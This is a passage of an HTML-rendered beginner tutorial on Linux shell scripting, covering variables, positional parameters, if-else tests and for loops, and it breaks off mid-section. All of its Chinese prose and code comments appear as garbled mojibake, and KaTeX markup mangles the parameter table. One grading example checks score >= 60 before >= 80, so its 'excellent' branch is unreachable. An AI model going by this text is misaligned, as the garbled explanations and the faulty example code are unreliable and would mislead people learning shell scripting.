.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Shellè„šæœ¬æ˜¯Linuxè¿ç»´çš„â€œæ•ˆç‡ç¥å™¨â€â€”â€”æŠŠé‡å¤çš„å‘½ä»¤ï¼ˆå¦‚æ‰¹é‡éƒ¨ç½²ã€æ—¥å¿—æ¸…ç†ã€æ•°æ®å¤‡ä»½ï¼‰å†™æˆè„šæœ¬ï¼Œä¸€é”®æ‰§è¡Œå°±èƒ½æ›¿ä»£æ‰‹åŠ¨æ“ä½œï¼Œå¤§å¹…æå‡å·¥ä½œæ•ˆç‡ã€‚æœ¬æ–‡ä»é›¶åŸºç¡€å…¥æ‰‹ï¼Œè¯¦è§£Shellè„šæœ¬æ ¸å¿ƒè¯­æ³•ï¼šå˜é‡ã€æ¡ä»¶åˆ¤æ–­ï¼ˆif-elseï¼‰ã€å¾ªç¯ï¼ˆfor/whileï¼‰ã€å‡½æ•°ï¼Œæ¯ä¸ªçŸ¥è¯†ç‚¹æ­é…å¯ç›´æ¥è¿è¡Œçš„å®æˆ˜æ¡ˆä¾‹ï¼Œè¦†ç›–æœç´¢å¼•æ“é«˜é¢‘æ£€ç´¢éœ€æ±‚ï¼ˆå¦‚Shellå˜é‡å®šä¹‰ã€if-elseæ¡ä»¶åˆ¤æ–­ã€forå¾ªç¯æ‰¹é‡æ“ä½œã€Shellå‡½æ•°å°è£…ï¼‰ï¼Œé€‚åˆè¿ç»´æ–°æ‰‹å¿«é€Ÿä¸Šæ‰‹ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€Shellè„šæœ¬å…¥é—¨ï¼šå…ˆææ‡‚â€œåŸºç¡€è§„åˆ™â€</h2>
<h3 data-id="heading-1">1. ä»€ä¹ˆæ˜¯Shellè„šæœ¬ï¼Ÿ</h3>
<p>Shellè„šæœ¬æ˜¯â€œä¸€ç³»åˆ—Linuxå‘½ä»¤çš„é›†åˆâ€ï¼Œä»¥<code>.sh</code>ä¸ºåç¼€ï¼Œé€šè¿‡è§£é‡Šå™¨ï¼ˆé»˜è®¤bashï¼‰æ‰§è¡Œã€‚ç®€å•æ¥è¯´ï¼šæŠŠä½ åœ¨ç»ˆç«¯æ‰‹åŠ¨æ•²çš„å‘½ä»¤ï¼ŒæŒ‰é¡ºåºå†™åˆ°æ–‡ä»¶é‡Œï¼Œæ·»åŠ æ‰§è¡Œæƒé™åå°±èƒ½æ‰¹é‡è¿è¡Œã€‚</p>
<h3 data-id="heading-2">2. è„šæœ¬åŸºæœ¬ç»“æ„ï¼ˆå¿…å†™3è¦ç´ ï¼‰</h3>
<p>æ–°å»ºä¸€ä¸ª<code>test.sh</code>è„šæœ¬ï¼Œæ ¸å¿ƒç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash  # å£°æ˜è§£é‡Šå™¨ï¼ˆå¿…é¡»å†™åœ¨ç¬¬ä¸€è¡Œï¼ŒæŒ‡å®šç”¨bashæ‰§è¡Œï¼‰</span>
<span class="hljs-comment"># è¿™æ˜¯æ³¨é‡Šï¼ˆ#å¼€å¤´çš„è¡Œä¸ä¼šæ‰§è¡Œï¼Œç”¨äºè¯´æ˜è„šæœ¬åŠŸèƒ½ï¼‰</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Hello Shell!"</span>  <span class="hljs-comment"># æ‰§è¡Œçš„å‘½ä»¤ï¼ˆè¾“å‡ºå­—ç¬¦ä¸²ï¼‰</span>
</code></pre>
<h3 data-id="heading-3">3. è„šæœ¬æ‰§è¡Œæ–¹å¼ï¼ˆ3ç§å¸¸ç”¨ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼1ï¼šèµ‹äºˆæ‰§è¡Œæƒé™åç›´æ¥è¿è¡Œï¼ˆæ¨èï¼‰</span>
<span class="hljs-built_in">chmod</span> +x test.sh  <span class="hljs-comment"># æ·»åŠ å¯æ‰§è¡Œæƒé™</span>
./test.sh         <span class="hljs-comment"># æ‰§è¡Œè„šæœ¬ï¼ˆ./è¡¨ç¤ºå½“å‰ç›®å½•ï¼‰</span>

<span class="hljs-comment"># æ–¹å¼2ï¼šé€šè¿‡bashè§£é‡Šå™¨æ‰§è¡Œï¼ˆæ— éœ€æ‰§è¡Œæƒé™ï¼‰</span>
bash test.sh

<span class="hljs-comment"># æ–¹å¼3ï¼šåœ¨å½“å‰Shellç¯å¢ƒæ‰§è¡Œï¼ˆä¼šå½±å“å½“å‰ç»ˆç«¯ï¼Œæ…ç”¨ï¼‰</span>
<span class="hljs-built_in">source</span> test.sh
. test.sh  <span class="hljs-comment"># ä¸sourceç­‰ä»·</span>
</code></pre>
<h2 data-id="heading-4">äºŒã€å˜é‡ï¼šShellè„šæœ¬çš„â€œæ•°æ®å®¹å™¨â€</h2>
<p>å˜é‡æ˜¯å­˜å‚¨æ•°æ®çš„è½½ä½“ï¼ŒShellè„šæœ¬ä¸­å˜é‡æ— éœ€å£°æ˜ç±»å‹ï¼Œç›´æ¥èµ‹å€¼å³å¯ï¼Œæ ¸å¿ƒåˆ†ä¸ºâ€œè‡ªå®šä¹‰å˜é‡â€â€œç³»ç»Ÿå˜é‡â€â€œä½ç½®å‚æ•°å˜é‡â€ä¸‰ç±»ã€‚</p>
<h3 data-id="heading-5">1. è‡ªå®šä¹‰å˜é‡ï¼ˆæœ€å¸¸ç”¨ï¼‰</h3>
<h4 data-id="heading-6">ï¼ˆ1ï¼‰å®šä¹‰ä¸èµ‹å€¼</h4>
<p>è¯­æ³•ï¼š<code>å˜é‡å=å€¼</code>ï¼ˆæ³¨æ„ï¼šç­‰å·ä¸¤è¾¹<strong>æ— ç©ºæ ¼</strong>ï¼Œç©ºæ ¼ä¼šè¢«è¯†åˆ«ä¸ºå‘½ä»¤åˆ†éš”ï¼‰</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># å®šä¹‰å˜é‡ï¼ˆå­—ç¬¦ä¸²ã€æ•°å­—å‡å¯ï¼‰</span>
name=<span class="hljs-string">"å¼ ä¸‰"</span>
age=28
score=95.5

<span class="hljs-comment"># è¾“å‡ºå˜é‡ï¼ˆ$å˜é‡å æˆ– ${å˜é‡å}ï¼Œ{}ç”¨äºåŒºåˆ†å˜é‡è¾¹ç•Œï¼‰</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"å§“åï¼š<span class="hljs-variable">$name</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"å¹´é¾„ï¼š<span class="hljs-variable">${age}</span>å²"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"åˆ†æ•°ï¼š<span class="hljs-variable">${score}</span>"</span>
</code></pre>
<h4 data-id="heading-7">ï¼ˆ2ï¼‰å˜é‡èµ‹å€¼è¿›é˜¶</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 1. å‘½ä»¤ç»“æœèµ‹å€¼ï¼ˆåå¼•å·`` æˆ– $()ï¼Œæ¨è$()ï¼‰</span>
ip=$(ifconfig eth0 | grep inet | awk <span class="hljs-string">'{print $2}'</span>)  <span class="hljs-comment"># è·å–eth0ç½‘å¡IP</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"æœåŠ¡å™¨IPï¼š<span class="hljs-variable">$ip</span>"</span>

<span class="hljs-comment"># 2. è¯»å–ç”¨æˆ·è¾“å…¥èµ‹å€¼ï¼ˆreadå‘½ä»¤ï¼‰</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"è¯·è¾“å…¥ä½ çš„æ‰‹æœºå·ï¼š"</span> phone  <span class="hljs-comment"># -pï¼šæç¤ºä¿¡æ¯</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ä½ è¾“å…¥çš„æ‰‹æœºå·æ˜¯ï¼š<span class="hljs-variable">$phone</span>"</span>

<span class="hljs-comment"># 3. å˜é‡æ‹¼æ¥</span>
prefix=<span class="hljs-string">"file_"</span>
suffix=<span class="hljs-string">".log"</span>
filename=<span class="hljs-variable">${prefix}</span>2025<span class="hljs-variable">${suffix}</span>  <span class="hljs-comment"># æ‹¼æ¥ä¸ºfile_2025.log</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"æ–‡ä»¶åï¼š<span class="hljs-variable">$filename</span>"</span>
</code></pre>
<h3 data-id="heading-8">2. ç³»ç»Ÿå˜é‡ï¼ˆå†…ç½®å˜é‡ï¼Œç›´æ¥ç”¨ï¼‰</h3>
<p>Shellå†…ç½®äº†å¸¸ç”¨ç³»ç»Ÿå˜é‡ï¼Œæ— éœ€å®šä¹‰ï¼Œç›´æ¥è°ƒç”¨å³å¯ï¼š</p>








































<table><thead><tr><th>å˜é‡å</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>$0</td><td>è„šæœ¬æ–‡ä»¶å</td><td>echo "è„šæœ¬åï¼š$0" â†’ è¾“å‡ºtest.sh</td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ’</mo></mrow><annotation encoding="application/x-tex">1-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">1</span><span class="mord">âˆ’</span></span></span></span></span>9</td><td>è„šæœ¬ä½ç½®å‚æ•°ï¼ˆæ‰§è¡Œè„šæœ¬æ—¶ä¼ å…¥çš„å‚æ•°ï¼‰</td><td>./test.sh 10 20 â†’ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>=</mo><mn>10</mn><mtext>ï¼Œ</mtext></mrow><annotation encoding="application/x-tex">1=10ï¼Œ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">10</span><span class="mord cjk_fallback">ï¼Œ</span></span></span></span></span>2=20</td></tr><tr><td>$#</td><td>ä½ç½®å‚æ•°çš„ä¸ªæ•°</td><td>./test.sh 10 20 â†’ $#=2</td></tr><tr><td>$?</td><td>ä¸Šä¸€æ¡å‘½ä»¤çš„æ‰§è¡ŒçŠ¶æ€ï¼ˆ0=æˆåŠŸï¼Œé0=å¤±è´¥ï¼‰</td><td>ls /tmp; echo $? â†’ è¾“å‡º0</td></tr><tr><td>$USER</td><td>å½“å‰ç™»å½•ç”¨æˆ·</td><td>echo "å½“å‰ç”¨æˆ·ï¼š$USER"</td></tr><tr><td>$PWD</td><td>å½“å‰å·¥ä½œç›®å½•</td><td>echo "å½“å‰è·¯å¾„ï¼š$PWD"</td></tr></tbody></table>
<p>å®æˆ˜ç¤ºä¾‹ï¼ˆä½ç½®å‚æ•°ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># è„šæœ¬åï¼šparam.sh</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"è„šæœ¬åï¼š<span class="hljs-variable">$0</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ç¬¬ä¸€ä¸ªå‚æ•°ï¼š<span class="hljs-variable">$1</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ç¬¬äºŒä¸ªå‚æ•°ï¼š<span class="hljs-variable">$2</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"å‚æ•°æ€»æ•°ï¼š<span class="hljs-variable">$#</span>"</span>

<span class="hljs-comment"># æ‰§è¡Œï¼š./param.sh åŒ—äº¬ ä¸Šæµ·</span>
<span class="hljs-comment"># è¾“å‡ºï¼š</span>
<span class="hljs-comment"># è„šæœ¬åï¼š./param.sh</span>
<span class="hljs-comment"># ç¬¬ä¸€ä¸ªå‚æ•°ï¼šåŒ—äº¬</span>
<span class="hljs-comment"># ç¬¬äºŒä¸ªå‚æ•°ï¼šä¸Šæµ·</span>
<span class="hljs-comment"># å‚æ•°æ€»æ•°ï¼š2</span>
</code></pre>
<h3 data-id="heading-9">3. å˜é‡ä½¿ç”¨æ³¨æ„äº‹é¡¹</h3>
<ul>
<li>å˜é‡ååªèƒ½åŒ…å«å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œä¸”ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼ˆå¦‚<code>1name</code>éæ³•ï¼Œ<code>name1</code>åˆæ³•ï¼‰ï¼›</li>
<li>å…¨å±€å˜é‡vså±€éƒ¨å˜é‡ï¼šé»˜è®¤å®šä¹‰çš„å˜é‡æ˜¯å…¨å±€çš„ï¼Œå‡½æ•°å†…ç”¨<code>local</code>å£°æ˜å±€éƒ¨å˜é‡ï¼›</li>
<li>ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼šå˜é‡å€¼åŒ…å«ç©ºæ ¼/ç‰¹æ®Šå­—ç¬¦æ—¶ï¼Œç”¨åŒå¼•å·åŒ…è£¹ï¼ˆå¦‚<code>path="/usr/local/bin"</code>ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-10">ä¸‰ã€æ¡ä»¶åˆ¤æ–­ï¼ˆif-elseï¼‰ï¼šè®©è„šæœ¬â€œåšé€‰æ‹©â€</h2>
<p>æ¡ä»¶åˆ¤æ–­æ˜¯è„šæœ¬çš„â€œé€»è¾‘æ ¸å¿ƒâ€â€”â€”æ ¹æ®æ¡ä»¶ï¼ˆå¦‚æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€æ•°å€¼å¤§å°ã€å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼‰æ‰§è¡Œä¸åŒå‘½ä»¤ï¼Œæ ¸å¿ƒè¯­æ³•æ˜¯<code>if-else</code>ã€‚</p>
<h3 data-id="heading-11">1. åŸºç¡€è¯­æ³•ç»“æ„</h3>
<h4 data-id="heading-12">ï¼ˆ1ï¼‰å•åˆ†æ”¯ï¼ˆæ»¡è¶³æ¡ä»¶æ‰æ‰§è¡Œï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span> [ æ¡ä»¶è¡¨è¾¾å¼ ]; <span class="hljs-keyword">then</span>
    æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-keyword">fi</span>  <span class="hljs-comment"># ç»“æŸifï¼ˆå¿…é¡»å†™ï¼‰</span>
</code></pre>
<h4 data-id="heading-13">ï¼ˆ2ï¼‰åŒåˆ†æ”¯ï¼ˆæ»¡è¶³/ä¸æ»¡è¶³åˆ†åˆ«æ‰§è¡Œï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span> [ æ¡ä»¶è¡¨è¾¾å¼ ]; <span class="hljs-keyword">then</span>
    æ»¡è¶³æ¡ä»¶æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-keyword">else</span>
    ä¸æ»¡è¶³æ¡ä»¶æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-14">ï¼ˆ3ï¼‰å¤šåˆ†æ”¯ï¼ˆå¤šä¸ªæ¡ä»¶åˆ¤æ–­ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span> [ æ¡ä»¶1 ]; <span class="hljs-keyword">then</span>
    æ¡ä»¶1æ»¡è¶³æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-keyword">elif</span> [ æ¡ä»¶2 ]; <span class="hljs-keyword">then</span>
    æ¡ä»¶2æ»¡è¶³æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-keyword">else</span>
    æ‰€æœ‰æ¡ä»¶éƒ½ä¸æ»¡è¶³æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-15">2. æ¡ä»¶è¡¨è¾¾å¼ï¼ˆæ ¸å¿ƒï¼šåˆ¤æ–­ä»€ä¹ˆï¼Ÿï¼‰</h3>
<p>æ¡ä»¶è¡¨è¾¾å¼æ˜¯<code>if</code>çš„â€œåˆ¤æ–­ä¾æ®â€ï¼Œå¸¸ç”¨3ç±»åˆ¤æ–­ï¼šæ•°å€¼æ¯”è¾ƒã€å­—ç¬¦ä¸²æ¯”è¾ƒã€æ–‡ä»¶åˆ¤æ–­ã€‚</p>
<h4 data-id="heading-16">ï¼ˆ1ï¼‰æ•°å€¼æ¯”è¾ƒï¼ˆæ•´æ•°ï¼‰</h4>








































<table><thead><tr><th>è¿ç®—ç¬¦</th><th>ä½œç”¨</th><th>ç¤ºä¾‹ï¼ˆåˆ¤æ–­10æ˜¯å¦å¤§äº5ï¼‰</th></tr></thead><tbody><tr><td>-eq</td><td>ç­‰äº</td><td>[ 10 -eq 5 ] â†’ å‡</td></tr><tr><td>-ne</td><td>ä¸ç­‰äº</td><td>[ 10 -ne 5 ] â†’ çœŸ</td></tr><tr><td>-gt</td><td>å¤§äº</td><td>[ 10 -gt 5 ] â†’ çœŸ</td></tr><tr><td>-lt</td><td>å°äº</td><td>[ 10 -lt 5 ] â†’ å‡</td></tr><tr><td>-ge</td><td>å¤§äºç­‰äº</td><td>[ 10 -ge 10 ] â†’ çœŸ</td></tr><tr><td>-le</td><td>å°äºç­‰äº</td><td>[ 10 -le 15 ] â†’ çœŸ</td></tr></tbody></table>
<p>å®æˆ˜ç¤ºä¾‹ï¼ˆåˆ¤æ–­åˆ†æ•°æ˜¯å¦åŠæ ¼ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"è¯·è¾“å…¥è€ƒè¯•åˆ†æ•°ï¼š"</span> score
<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$score</span> -ge 60 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"åŠæ ¼ï¼"</span>
<span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$score</span> -ge 80 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ä¼˜ç§€ï¼"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ä¸åŠæ ¼ï¼"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-17">ï¼ˆ2ï¼‰å­—ç¬¦ä¸²æ¯”è¾ƒ</h4>






























<table><thead><tr><th>è¿ç®—ç¬¦</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>=</td><td>ç­‰äº</td><td>[ "abc" = "abc" ] â†’ çœŸ</td></tr><tr><td>!=</td><td>ä¸ç­‰äº</td><td>[ "abc" != "def" ] â†’ çœŸ</td></tr><tr><td>-z</td><td>å­—ç¬¦ä¸²ä¸ºç©º</td><td>[ -z "$str" ] â†’ å­—ç¬¦ä¸²ä¸ºç©ºæ—¶çœŸ</td></tr><tr><td>-n</td><td>å­—ç¬¦ä¸²éç©º</td><td>[ -n "$str" ] â†’ å­—ç¬¦ä¸²éç©ºæ—¶çœŸ</td></tr></tbody></table>
<p>å®æˆ˜ç¤ºä¾‹ï¼ˆåˆ¤æ–­ç”¨æˆ·è¾“å…¥æ˜¯å¦ä¸ºç©ºï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"è¯·è¾“å…¥ä½ çš„å§“åï¼š"</span> name
<span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$name</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"é”™è¯¯ï¼šå§“åä¸èƒ½ä¸ºç©ºï¼"</span>
<span class="hljs-keyword">elif</span> [ <span class="hljs-string">"<span class="hljs-variable">$name</span>"</span> = <span class="hljs-string">"admin"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"æ¬¢è¿ç®¡ç†å‘˜ï¼"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ä½ å¥½ï¼Œ<span class="hljs-variable">$name</span>ï¼"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-18">ï¼ˆ3ï¼‰æ–‡ä»¶åˆ¤æ–­ï¼ˆè¿ç»´é«˜é¢‘ï¼‰</h4>








































<table><thead><tr><th>è¿ç®—ç¬¦</th><th>ä½œç”¨</th><th>ç¤ºä¾‹ï¼ˆåˆ¤æ–­/tmp/test.logï¼‰</th></tr></thead><tbody><tr><td>-f</td><td>æ˜¯å¦ä¸ºæ™®é€šæ–‡ä»¶</td><td>[ -f /tmp/test.log ] â†’ æ–‡ä»¶å­˜åœ¨ä¸”æ˜¯æ™®é€šæ–‡ä»¶åˆ™çœŸ</td></tr><tr><td>-d</td><td>æ˜¯å¦ä¸ºç›®å½•</td><td>[ -d /tmp ] â†’ ç›®å½•å­˜åœ¨åˆ™çœŸ</td></tr><tr><td>-e</td><td>æ–‡ä»¶/ç›®å½•æ˜¯å¦å­˜åœ¨</td><td>[ -e /tmp/test.log ] â†’ å­˜åœ¨åˆ™çœŸ</td></tr><tr><td>-r</td><td>æ˜¯å¦æœ‰è¯»æƒé™</td><td>[ -r /tmp/test.log ] â†’ æœ‰è¯»æƒé™åˆ™çœŸ</td></tr><tr><td>-w</td><td>æ˜¯å¦æœ‰å†™æƒé™</td><td>[ -w /tmp/test.log ] â†’ æœ‰å†™æƒé™åˆ™çœŸ</td></tr><tr><td>-x</td><td>æ˜¯å¦æœ‰æ‰§è¡Œæƒé™</td><td>[ -x /tmp/script.sh ] â†’ æœ‰æ‰§è¡Œæƒé™åˆ™çœŸ</td></tr></tbody></table>
<p>å®æˆ˜ç¤ºä¾‹ï¼ˆåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»ºï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
file=<span class="hljs-string">"/tmp/test.log"</span>
<span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$file</span>å·²å­˜åœ¨ï¼Œæ–‡ä»¶å¤§å°ï¼š<span class="hljs-subst">$(du -h $file | awk '{print $1}')</span>"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$file</span>ä¸å­˜åœ¨ï¼Œæ­£åœ¨åˆ›å»º..."</span>
    <span class="hljs-built_in">touch</span> <span class="hljs-variable">$file</span>  <span class="hljs-comment"># åˆ›å»ºæ–‡ä»¶</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"åˆ›å»ºæˆåŠŸï¼"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-19">3. æ¡ä»¶åˆ¤æ–­é¿å‘ç‚¹</h3>
<ul>
<li>æ¡ä»¶è¡¨è¾¾å¼çš„<code>[ ]</code>ä¸¤è¾¹å¿…é¡»æœ‰ç©ºæ ¼ï¼ˆå¦‚<code>[ $score -ge 60 ]</code>ï¼Œå°‘ç©ºæ ¼ä¼šæŠ¥é”™ï¼‰ï¼›</li>
<li>å˜é‡å€¼å¯èƒ½ä¸ºç©ºæ—¶ï¼Œç”¨åŒå¼•å·åŒ…è£¹ï¼ˆå¦‚<code>[ -z "$name" ]</code>ï¼Œé¿å…<code>[ -z ]</code>è¯­æ³•é”™è¯¯ï¼‰ï¼›</li>
<li>å¤šä¸ªæ¡ä»¶ç»„åˆï¼šç”¨<code>&amp;&amp;</code>ï¼ˆä¸”ï¼‰ã€<code>||</code>ï¼ˆæˆ–ï¼‰ï¼Œç¤ºä¾‹ï¼š<code>if [ $age -gt 18 ] &amp;&amp; [ $age -lt 60 ]; then</code>ã€‚</li>
</ul>
<h2 data-id="heading-20">å››ã€å¾ªç¯ï¼šè®©è„šæœ¬â€œé‡å¤åšäº‹â€</h2>
<p>å¾ªç¯æ˜¯è„šæœ¬çš„â€œæ•ˆç‡æ ¸å¿ƒâ€â€”â€”æ‰¹é‡å¤„ç†æ–‡ä»¶ã€éå†æœåŠ¡å™¨åˆ—è¡¨ã€é‡å¤æ‰§è¡Œå‘½ä»¤éƒ½é å¾ªç¯ï¼ŒShellå¸¸ç”¨<code>for</code>å’Œ<code>while</code>å¾ªç¯ã€‚</p>
<h3 data-id="heading-21">1. forå¾ªç¯ï¼ˆéå†åˆ—è¡¨/èŒƒå›´ï¼‰</h3>
<h4 data-id="heading-22">ï¼ˆ1ï¼‰åŸºç¡€è¯­æ³•ï¼ˆéå†åˆ—è¡¨ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">for</span> å˜é‡ <span class="hljs-keyword">in</span> åˆ—è¡¨; <span class="hljs-keyword">do</span>
    æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-keyword">done</span>
</code></pre>
<p>å®æˆ˜ç¤ºä¾‹1ï¼ˆéå†å­—ç¬¦ä¸²åˆ—è¡¨ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># éå†åŸå¸‚åˆ—è¡¨</span>
cities=<span class="hljs-string">"åŒ—äº¬ ä¸Šæµ· å¹¿å· æ·±åœ³"</span>
<span class="hljs-keyword">for</span> city <span class="hljs-keyword">in</span> <span class="hljs-variable">$cities</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å½“å‰åŸå¸‚ï¼š<span class="hljs-variable">$city</span>"</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># è¾“å‡ºï¼š</span>
<span class="hljs-comment"># å½“å‰åŸå¸‚ï¼šåŒ—äº¬</span>
<span class="hljs-comment"># å½“å‰åŸå¸‚ï¼šä¸Šæµ·</span>
<span class="hljs-comment"># å½“å‰åŸå¸‚ï¼šå¹¿å·</span>
<span class="hljs-comment"># å½“å‰åŸå¸‚ï¼šæ·±åœ³</span>
</code></pre>
<p>å®æˆ˜ç¤ºä¾‹2ï¼ˆéå†æ•°å­—èŒƒå›´ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># éå†1-5ï¼ˆæ‰¹é‡åˆ›å»ºæ–‡ä»¶ï¼‰</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..5}; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">touch</span> /tmp/file_<span class="hljs-variable">$i</span>.txt  <span class="hljs-comment"># åˆ›å»ºfile_1.txtåˆ°file_5.txt</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å·²åˆ›å»ºï¼š/tmp/file_<span class="hljs-variable">$i</span>.txt"</span>
<span class="hljs-keyword">done</span>
</code></pre>
<p>å®æˆ˜ç¤ºä¾‹3ï¼ˆéå†æ–‡ä»¶ï¼ˆè¿ç»´é«˜é¢‘ï¼‰ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># éå†/tmpä¸‹æ‰€æœ‰.logæ–‡ä»¶ï¼Œç»Ÿè®¡å¤§å°</span>
<span class="hljs-keyword">for</span> <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> /tmp/*.<span class="hljs-built_in">log</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"<span class="hljs-variable">$log</span>"</span> ]; <span class="hljs-keyword">then</span>  <span class="hljs-comment"># ç¡®ä¿æ˜¯æ–‡ä»¶ï¼ˆé¿å…ç›®å½•ï¼‰</span>
        size=$(<span class="hljs-built_in">du</span> -h <span class="hljs-variable">$log</span> | awk <span class="hljs-string">'{print $1}'</span>)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$log</span> â†’ å¤§å°ï¼š<span class="hljs-variable">$size</span>"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h4 data-id="heading-23">ï¼ˆ2ï¼‰Cé£æ ¼forå¾ªç¯ï¼ˆæ•°å€¼å¾ªç¯ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">for</span> (( åˆå§‹å€¼; æ¡ä»¶; æ­¥é•¿ )); <span class="hljs-keyword">do</span>
    æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-keyword">done</span>
</code></pre>
<p>ç¤ºä¾‹ï¼ˆè®¡ç®—1-100çš„å’Œï¼‰ï¼š</p>
